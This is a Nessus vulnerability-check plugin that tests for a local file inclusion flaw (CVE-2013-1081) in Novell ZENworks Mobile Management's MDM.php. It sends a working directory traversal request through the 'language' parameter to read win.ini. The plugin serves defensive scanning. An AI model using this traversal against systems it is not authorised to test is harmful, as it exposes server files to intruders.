#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(65551);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/02/08 22:04:49 $");

  script_cve_id("CVE-2013-1081");
  script_bugtraq_id(58402);
  script_osvdb_id(91119);

  script_name(english:"Novell ZENworks Mobile Management MDM.php Local File Inclusion");
  script_summary(english:"Tries to exploit local file inclusion vulnerability.");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote host is affected by a local file inclusion vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Nessus was able to exploit a local file inclusion vulnerability in the
'language' parameter of Novell ZENworks Mobile Management's 'MDM.php'
script by sending a specially crafted HTTP GET request.  By providing a
directory traversal string, it is possible to access any file on the
system accessible by the web server. 

Note that hosts affected by this vulnerability are likely affected by a
similar vulnerability in 'DUSAP.php'."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-087/");
  # http://www.novell.com/products/zenworks/mobile-management/services-and-support/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f14cd83b");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to Novell ZENworks Mobile Management 2.7.1 or later, when it
becomes available."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Novell Zenworks Mobile Managment MDM.php Local File Inclusion Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/03/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:zenworks_mobile_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("novell_zenworks_mobile_management_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = "Novell ZENworks Mobile Management";

port = get_http_port(default:80);

install = get_install_from_kb(
  appname:'novell_zenworks_mobile_management',
  port:port,
  exit_on_fail:TRUE
);

vuln_script = install['dir'] + '/mobile/MDM.php';

file_list = make_list("windows/win.ini",
                      "winnt/win.ini");

traversal = mult_str(str:"../", nb:15);

exploit_request = NULL;
exploit_response = NULL;

foreach file (file_list)
{
  exploit = vuln_script + "?language=res/languages/" + traversal + file;
  res = http_send_recv3(method:"GET",
                        item:exploit,
                        port:port,
                        exit_on_fail:TRUE);

  if (
    "[Mail]" >< res[2] || 
    "[fonts]" >< res[2] ||
    "; for 16-bit app support" >< res[2]
  )
  {
    exploit_request = exploit;
    exploit_response = chomp(res[2]);
    break;
  }
}

if (!isnull(exploit_request))
{
  if (report_verbosity > 0)
  {
    report =
      '\n  Nessus was able to exploit the vulnerability with the following' +
      '\n  request : \n\n' + build_url(port:port, qs:exploit_request) + '\n';

    if (report_verbosity > 1)
    {
      report += '\n  Server Response (contents of win.ini) : \n\n'
                + exploit_response + '\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(port:port, qs:'/'));
